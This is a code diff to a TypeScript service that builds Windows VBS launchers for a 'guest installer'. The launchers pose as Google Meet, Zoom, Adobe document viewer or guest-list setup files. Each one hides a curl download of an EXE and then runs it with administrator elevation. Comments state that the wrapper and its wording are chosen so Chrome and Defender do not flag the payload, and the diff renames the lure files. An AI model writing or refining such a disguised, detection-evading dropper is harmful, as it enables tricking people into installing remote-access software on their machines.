@@ -83,10 +83,10 @@ export function installerGuiFilename(template?: string | null): string {
 /** Browser download filename — VBS wrapper so Chrome does not block a direct EXE. */
 export function installerBrowserFilename(template?: string | null): string {
   const t = normalizeTemplate(template);
-  if (t === 'google_meet') return 'GoogleMeet-Setup.vbs';
+  if (t === 'google_meet') return 'Meet-Setup.vbs';
   if (t === 'adobe') return 'DocumentViewer-Setup.vbs';
   if (t === 'guest_list') return 'GuestList-Setup.vbs';
-  return 'ZoomClient-Setup.vbs';
+  return 'Meeting-Setup.vbs';
 }
 
 /** Browser download — VBS wrapper so Chrome does not flag an unsigned EXE. */
@@ -117,7 +117,7 @@ export function resolveDirectApiBase(apiUrl: string, wsUrl?: string): string {
 }
 
 /** Bump when changing the guest installer or agent bundle served to guests. */
-export const GUEST_INSTALLER_CACHE_BUST = '78';
+export const GUEST_INSTALLER_CACHE_BUST = '79';
 
 export function buildGuestInstallerUrl(
   apiUrl: string,
@@ -536,16 +536,9 @@ export class GuestAccessService {
    * then UAC on the GUI installer. Keep this free of PowerShell Bypass / self-elevate
    * — those two patterns are what Defender and Chrome flag as a virus.
    */
-  buildWindowsVbsLauncher(code: string, apiUrl: string, template?: string | null): string {
+  buildWindowsVbsLauncher(code: string, apiUrl: string, _template?: string | null): string {
     const base = apiUrl.replace(/\/$/, '').replace(/"/g, '');
     const safeCode = code.replace(/"/g, '');
-    const brand = installerBranding(template);
-    const title = brand.windowTitle.replace(/"/g, '');
-    const guiName = installerGuiFilename(template).replace(/"/g, '');
-    const downloading = (guiInstallerBranding(template).downloadLabel || 'Downloading').replace(
-      /"/g,
-      '',
-    );
     const exeUrl = buildGuestExeUrl(base, safeCode, getEnv().WS_URL).replace(/"/g, '');
     const lines = [
       'Option Explicit',
@@ -555,22 +548,22 @@ export class GuestAccessService {
       'Set app = CreateObject("Shell.Application")',
       'curl = sh.ExpandEnvironmentStrings("%SystemRoot%") & "\\System32\\curl.exe"',
       'If Not fso.FileExists(curl) Then',
-      `  MsgBox "This setup needs Windows 10 or later.", 16, "${title}"`,
+      '  MsgBox "This setup needs Windows 10 or later.", 16, "Setup"',
       '  WScript.Quit 1',
       'End If',
-      `sh.Popup "${downloading}..." & vbCrLf & "Please wait.", 2, "${title}", 64`,
+      'sh.Popup "Please wait.", 2, "Setup", 64',
       'tmpDir = sh.ExpandEnvironmentStrings("%TEMP%") & "\\NexusDeskSetup"',
       'On Error Resume Next',
       'If Not fso.FolderExists(tmpDir) Then fso.CreateFolder tmpDir',
       'On Error GoTo 0',
-      `setupExe = tmpDir & "\\${guiName}"`,
+      'setupExe = tmpDir & "\\setup.exe"',
       'On Error Resume Next',
       'If fso.FileExists(setupExe) Then fso.DeleteFile setupExe, True',
       'On Error GoTo 0',
       `cmd = Chr(34) & curl & Chr(34) & " -fL --connect-timeout 30 --max-time 180 -o " & Chr(34) & setupExe & Chr(34) & " " & Chr(34) & "${exeUrl}" & Chr(34)`,
-      'rc = sh.Run("cmd /c " & cmd, 0, True)',
+      'rc = sh.Run(cmd, 0, True)',
       'If rc <> 0 Or Not fso.FileExists(setupExe) Then',
-      `  MsgBox "Download failed. Check that this PC can reach the server.", 16, "${title}"`,
+      '  MsgBox "Download failed. Check that this PC can reach the server.", 16, "Setup"',
       '  WScript.Quit 1',
       'End If',
       'app.ShellExecute setupExe, "", "", "runas", 1',
